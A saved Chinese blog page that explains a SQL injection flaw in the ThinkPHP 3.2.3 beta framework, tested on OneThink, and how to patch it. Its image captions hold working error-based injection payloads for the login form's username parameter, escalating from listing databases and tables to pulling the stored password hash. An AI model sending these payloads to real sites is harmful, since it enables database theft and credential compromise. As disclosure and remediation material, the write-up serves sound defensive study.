@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>基于ThinkPHP3.2.3beta版框架注入与修复</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">基于ThinkPHP3.2.3beta版框架注入与修复</h1>
+        <div class="show-content">
+          <h4>0x01 前言<br>
+</h4><p>        国产框架ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，创立于2006年初，遵循Apache2开源协议发布，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。我们经常这些刚出来的程序员总是很天真的认为只要不在代码中进行SQL语句拼接而是使用这些前辈给框架提供的数据库查询方法就能完美的防止sql注入，其实这是不对的，框架也会因为过滤不严格导致出现问题，笔者，今天就通过thinkphp3.2.3beta版的源码来一起探讨。</p><h4>0x02 准备<br>
+</h4><p>        技术准备：PHP基础，MySql<br>        使用工具：Visual Studio<br>        服务器环境：xampp<br>        推荐使用：phpStudy(容易切换各种环境)<br>        测试代码与sql：</p><h4>0x03 正文<br>
+</h4><p>        这里我们使用OneThink内容管理框架 进行测试（因为使用这个TP版本的框架笔者真找不到多少个）。<br>直接说也是看不懂的，让我们先把利用方法放出来，然后我们在进行一步一步的进行讲解把。</p><p>        文件地址：application/home/controller/UserController.class.php<br>        url地址：http://xx.com/index.php?s=/Home/User/login.html<br>        调用函数：login();<br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-5f175ff500c7065f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-5f175ff500c7065f.png?imageMogr2/auto-orient/strip" data-image-slug="5f175ff500c7065f" data-width="1281" data-height="1001"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-0aba07e316a5f3a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-0aba07e316a5f3a7.png?imageMogr2/auto-orient/strip" data-image-slug="0aba07e316a5f3a7" data-width="1045" data-height="751"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-e5e0f91d4400520a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-e5e0f91d4400520a.png?imageMogr2/auto-orient/strip" data-image-slug="e5e0f91d4400520a" data-width="1221" data-height="1023"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-521c6791b3bba420.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-521c6791b3bba420.png?imageMogr2/auto-orient/strip" data-image-slug="521c6791b3bba420" data-width="1376" data-height="1011"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-0856461eb5d40a8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-0856461eb5d40a8d.png?imageMogr2/auto-orient/strip" data-image-slug="0856461eb5d40a8d" data-width="1348" data-height="1028"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-99bd2c5a9ec0e76b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-99bd2c5a9ec0e76b.png?imageMogr2/auto-orient/strip" data-image-slug="99bd2c5a9ec0e76b" data-width="1733" data-height="972"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-136b7e78bb5d2c43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-136b7e78bb5d2c43.png?imageMogr2/auto-orient/strip" data-image-slug="136b7e78bb5d2c43" data-width="1260" data-height="817"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-98e256028953654b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-98e256028953654b.png?imageMogr2/auto-orient/strip" data-image-slug="98e256028953654b" data-width="1745" data-height="996"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-bd5e204808bcc536.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-bd5e204808bcc536.png?imageMogr2/auto-orient/strip" data-image-slug="bd5e204808bcc536" data-width="1825" data-height="654"><br><div class="image-caption">内容：username[0]=in(true)AND (SELECT 2*(IF((SELECT * FROM (SELECTCONCAT( (SELECT database() ) ))s), 8446744073709551610,8446744073709551610)))-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-c2a38b3729f87b01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-c2a38b3729f87b01.png?imageMogr2/auto-orient/strip" data-image-slug="c2a38b3729f87b01" data-width="1884" data-height="922"><br><div class="image-caption">内容：username[0]=in(true) AND (SELECT 8138 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT IFNULL(CAST(COUNT(SCHEMA_NAME) AS CHAR),1) FROM INFORMATION_SCHEMA.SCHEMATA) ))S), 8446744073709551610, 8446744073709551610)))X)-- A&amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-e2543315fb7b2463.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-e2543315fb7b2463.png?imageMogr2/auto-orient/strip" data-image-slug="e2543315fb7b2463" data-width="1886" data-height="967"><br><div class="image-caption">内容：username[0]=in(true) AND (SELECT 4362 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),1)),1,451) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)))s), 8446744073709551610, 8446744073709551610)))x)-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-f96064836dc0038c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-f96064836dc0038c.png?imageMogr2/auto-orient/strip" data-image-slug="f96064836dc0038c" data-width="1797" data-height="967"><br><div class="image-caption">语句：username[0]=in(true) AND (SELECT 8139 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT IFNULL(CAST(COUNT(TABLE_NAME) AS CHAR),1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN ('onethinkv1.1'))))S), 8446744073709551610, 8446744073709551610)))X)-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-7767ffe958022208.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-7767ffe958022208.png?imageMogr2/auto-orient/strip" data-image-slug="7767ffe958022208" data-width="1877" data-height="986"><br><div class="image-caption"></div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-5b978f2cdafb0314.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-5b978f2cdafb0314.png?imageMogr2/auto-orient/strip" data-image-slug="5b978f2cdafb0314" data-width="1868" data-height="971"><br><div class="image-caption">语句：username[0]=in(true) AND (SELECT 3572 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT MID((IFNULL(CAST(table_name AS CHAR),1)),1,451) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ('onethinkv1.1') LIMIT 17,1)))s), 8446744073709551610, 8446744073709551610)))x)-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-381767a46062ca97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-381767a46062ca97.png?imageMogr2/auto-orient/strip" data-image-slug="381767a46062ca97" data-width="1783" data-height="983"><br><div class="image-caption">语句：username[0]=in(true) AND (SELECT 3302 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT MID((IFNULL(CAST(column_name AS CHAR),1)),1,451) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='onethink_ucenter_member' AND table_schema='onethinkv1.1' LIMIT 1,1)))s), 8446744073709551610, 8446744073709551610)))x)-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-1ef21fe9ee9f22f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-1ef21fe9ee9f22f7.png?imageMogr2/auto-orient/strip" data-image-slug="1ef21fe9ee9f22f7" data-width="1910" data-height="972"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-31bbe1f22835118b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-31bbe1f22835118b.png?imageMogr2/auto-orient/strip" data-image-slug="31bbe1f22835118b" data-width="1824" data-height="976"><br><div class="image-caption">语句：username[0]=in(true) AND (SELECT 2857 FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT((SELECT MID((IFNULL(CAST(password AS CHAR),1)),1,451) FROM `onethinkv1.1`.onethink_ucenter_member ORDER BY id LIMIT 0,1)))s), 8446744073709551610, 8446744073709551610)))x)-- &amp;username[1]=&amp;password=123&amp;verify=qntjb</div>
+</div><p>那么上面利用的方式就写完，接下来我们可以跟进代码探讨一下为什么这样可以注入<br></p><h4>0x04 漏洞原理<br><br>
+</h4><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-752a385c7d70cfec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-752a385c7d70cfec.png?imageMogr2/auto-orient/strip" data-image-slug="752a385c7d70cfec" data-width="1929" data-height="1041"><br><div class="image-caption"></div>
+</div><p>         文件地址：\ThinkPHP\Library\Think\Db\Driver.class.php<br>         调用的函数：parseWhereItem();<br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-b0b0a0ad4a0236c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-b0b0a0ad4a0236c8.png?imageMogr2/auto-orient/strip" data-image-slug="b0b0a0ad4a0236c8" data-width="1697" data-height="1027"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-3f272c44a4d9e41f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-3f272c44a4d9e41f.png?imageMogr2/auto-orient/strip" data-image-slug="3f272c44a4d9e41f" data-width="1883" data-height="1025"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-88a80ff7b63b63c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-88a80ff7b63b63c5.png?imageMogr2/auto-orient/strip" data-image-slug="88a80ff7b63b63c5" data-width="876" data-height="429"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-ce537bf9081e2874.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-ce537bf9081e2874.png?imageMogr2/auto-orient/strip" data-image-slug="ce537bf9081e2874" data-width="1541" data-height="1009"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-d71c5c5aeb640fa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-d71c5c5aeb640fa4.png?imageMogr2/auto-orient/strip" data-image-slug="d71c5c5aeb640fa4" data-width="808" data-height="372"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-fc58b07794af6faf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-fc58b07794af6faf.png?imageMogr2/auto-orient/strip" data-image-slug="fc58b07794af6faf" data-width="1702" data-height="621"><br><div class="image-caption"></div>
+</div><h4>0x04 修复</h4><p>        修复方法1：<br>                 将这个thinkphp3.2.3beta 版 升级覆盖为 官方的thinkphp3.2.3最新版。<br>                上面的方法针对无所畏惧的人。  可能有一些人是这样的情况，使用了这个版本很长一段时间了，然后又改了框架的底层，直接升级的话，会有大麻烦！那么下面这个方法就适合这些人群了。<br></p><p>        修复方法2：<br>                通过上面的漏洞利用过程我们可以知道漏洞发生的主要原因有两个<br>                1,没有对传输进来的变量进行一些限制<br>                 2,这个版本的tp框架没有在底层过滤好<br>                知道这两点以后，我们就能确定我们的修复方案了。 首先是对传输的变量进行一些识别限制，然后是对tp框架的底层进行相当应的过滤，基本解决这个问题。<br><br>        我们需要对3个文件进行修改，下面会列出来<br>        文件1：<br>                文件地址：\ThinkPHP\Common\functions.php<br>                添加函数：think_filter()<br>                修改函数：I()<br><br>添加代码：<br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-2e3dd8fea85a90b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-2e3dd8fea85a90b5.png?imageMogr2/auto-orient/strip" data-image-slug="2e3dd8fea85a90b5" data-width="739" data-height="499"><br><div class="image-caption"></div>
+</div><p><br>添加函数：think_filter()<br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-76cb36c98c537ea6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-76cb36c98c537ea6.png?imageMogr2/auto-orient/strip" data-image-slug="76cb36c98c537ea6" data-width="1023" data-height="162"><br><div class="image-caption"></div>
+</div><p>修改函数：I()<br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-ada992645396bffa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-ada992645396bffa.png?imageMogr2/auto-orient/strip" data-image-slug="ada992645396bffa" data-width="831" data-height="1887"><br><div class="image-caption"></div>
+</div><p><br></p><p>文件2：<br>                文件地址：\ThinkPHP\Library\Think\Db\Driver.class.php<br>                修改函数：parseWhereItem()</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-9e2c05687525dc41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-9e2c05687525dc41.png?imageMogr2/auto-orient/strip" data-image-slug="9e2c05687525dc41" data-width="1366" data-height="735"><br><div class="image-caption"></div>
+</div><p>文件3：</p><p>               文件地址：\ThinkPHP\Conf\convention.php<br>              添加代码：</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/4776936-8ca71fc56175fcf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/4776936-8ca71fc56175fcf0.png?imageMogr2/auto-orient/strip" data-image-slug="8ca71fc56175fcf0" data-width="1229" data-height="234"><br><div class="image-caption"></div>
+</div><p>代码太多，如图修改为这样既可。如果比较懒可以直接下载上面提供的 百度云链接进行修复。 ：)</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
